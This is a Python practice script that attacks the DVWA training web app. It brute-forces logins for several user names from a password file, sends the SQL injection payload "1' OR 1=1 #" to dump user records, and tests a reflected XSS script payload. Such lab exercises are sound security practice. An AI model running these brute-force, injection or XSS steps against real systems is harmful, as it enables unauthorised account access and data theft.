import requests
import hashlib
from bs4 import BeautifulSoup as bs

host = input( "DVWA IP or Host: " )
url  = "http://" + host

try:
    # ----- Session Connect -----
    sessid     = requests.get( url )
    csrf_token = hashlib.md5( "1234".encode() ).hexdigest() # uniqid() -> "1234"
    data       = { 'username':'admin', 'password':'password', 'Login':'Login', 'user_token':csrf_token }

    session = dict( sessid.request._cookies ) # Create PHPSESSID
    session['security'] = 'low'

    requests.post( url + "/login.php", data = data, cookies = session ) # login, session connect
    print( "\nLogin Success\nPHPSESSID: " + dict( sessid.request._cookies )['PHPSESSID'] + "\n" )

    # ----- Brute Force -----
    print( "\n\nBrute Force\n" )

    with open( "password.txt", "r" ) as f:
        datas = f.readlines()

    brute_force_id_list = [ "admin", "gordonb", "1337", "pablo", "smithy", "test" ]
    brute_force_pw_list = [ data.replace( "\n", "" ) for data in datas ]
    account = {}

    for brute_force_id in brute_force_id_list:
        print( "attack: {0}".format( brute_force_id ) )
        msg = "Not Matched"

        for brute_force_pw in brute_force_pw_list:
            brute_force = requests.get( url + "/vulnerabilities/brute", cookies = session, params = { "username":brute_force_id, "password":brute_force_pw, "Login":"Login" } )

            if not bs( brute_force.content, "html.parser" ).find_all( "pre" ):
                account[ brute_force_id ] = brute_force_pw
                msg = "OK"
                break

        print( msg )

    print( "\n{0: <10} {1}".format( "ID", "Pw" ) )
    for key, value in account.items():
        print( "{0: <10} {1}".format( key, value ) )


    # ----- SQL Injection -----
    print( "\n\nSQL Injection\n" )
    sql_injection = requests.get( url + "/vulnerabilities/sqli", cookies = session, params = { 'id':"1' OR 1=1 #", 'Submit':'Submit' } )
    for data in bs( sql_injection.content, "html.parser" ).find_all( "pre" ):
        lines = str( data ).split( "<br/>" )

        print( lines[1] + "    " + lines[2][:-6] )


    # ----- XSS (Reflected) -----
    print( "\n\nXSS (Reflected)\n" )
    payloads = [ '<script>alert()</script>' ]
    for payload in payloads:
        print( "Payload: " + payload )
        xss = requests.get( url + "/vulnerabilities/xss_r", cookies = session, params = { 'name':payload } )
        print( "OK" ) if payload in str( bs( xss.content, "html.parser" ).find_all( "pre" )[0] ) else print( "방어성공" )


except:
    print( "Check IP or Host" )


